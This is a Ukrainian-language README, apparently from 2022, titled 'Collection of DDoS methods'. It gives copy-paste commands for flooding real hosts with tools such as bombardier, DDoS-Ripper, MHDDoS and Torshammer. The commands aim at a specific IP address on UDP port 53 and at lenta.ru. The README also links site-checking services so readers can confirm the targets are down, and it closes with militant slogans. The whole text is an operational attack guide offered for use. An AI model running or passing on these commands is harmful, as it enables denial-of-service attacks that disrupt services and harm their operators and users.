# Збірка DDoS методів


## Провірка

**ping** метод (відкривати в Tor Browser або в будь-якому якщо є окрмеий VPN).

Ці сайти, це аналог звичайного ping-a тільки є дані про репліки (лоад балансінг хости)

```
https://port.ping.pe/194.54.14.186:53
```

Клікнути на ОК, і чекати поки інфо рефрешнеться про всі репліки. Ціль - ВСІ ЧЕРВОНІ

А тут вписати ТІЛЬКИ ХОСТ і клікнути UDP port (або Ping для провірки)

```
https://check-host.net/check-udp?host=194.54.14.187
```


## DDoS-имо з Docker-ом



**Docker** метод 1 (треба VPN)

https://hub.docker.com/r/alpine/bombardier

```
docker run -ti --rm alpine/bombardier -c 10000 -d 3600s -l 194.54.14.186:53/UDP
```

**Docker** метод 2 (треба VPN)




## DDoS-имо з Python-ом



**DDoS-Ripper** PYTHON метод (треба VPN)

https://github.com/palahsu/DDoS-Ripper

```
git clone https://github.com/palahsu/DDoS-Ripper.git
cd DDoS-Ripper
python3 DRipper.py -s 194.54.14.186 -p 53 -t 135 -q 10000 
```

**runner** (обгортка над DDoS Runner)
https://github.com/nitupkcuf/runner
що загалом в мене так і не запрацювало толком

```
brew install --cask docker
docker run --rm -it nitupkcuf/ddos-ripper:latest {HOSTNAME | IP}
```

**MHDDoS** PYTHON (тільки 3) метод (треба VPN)

https://github.com/MHProDev/MHDDoS

```
git clone https://github.com/MHProDev/MHDDoS.git
cd MHDDoS
pip3 install -r requirements.txt 
python3 start.py udp 194.54.14.186:53 1000 3600
```

Норм якщо ви бачите "Attack Started !"
Але в мене на іншому компі депси не проінсталиись. рестартував. хз.


**Tors Hammer**

```
Download manually from https://sourceforge.net/projects/torshammer/
or 
wget https://iweb.dl.sourceforge.net/project/torshammer/Torshammer/1.0/Torshammer%201.0.zip
unzip Torshammer\ 1.0.zip
cd Torshammer\ 1.0
./torshammer.py -t lenta.ru -p 80 -t 1024
```

Щоб вийти з процесу треба Ctrl + Z (бо Ctrl + C не виходить)
Норм коли пише
Posting: щось там....
і connected to host...



TODO
- https://blog.cloudflare.com/memcrashed-major-amplification-attacks-from-port-11211/



# Більше про DDoS

https://tarahtino.notion.site/tarahtino/DDoS-1505b74f6f8443768dc47e0f4d2ee8b2

# Слава Україні!

# Героям Слава!

# Слава Нації!

# Смерть Ворогам!

# Україна понад усе

PS. Maintained by @Andrii_L
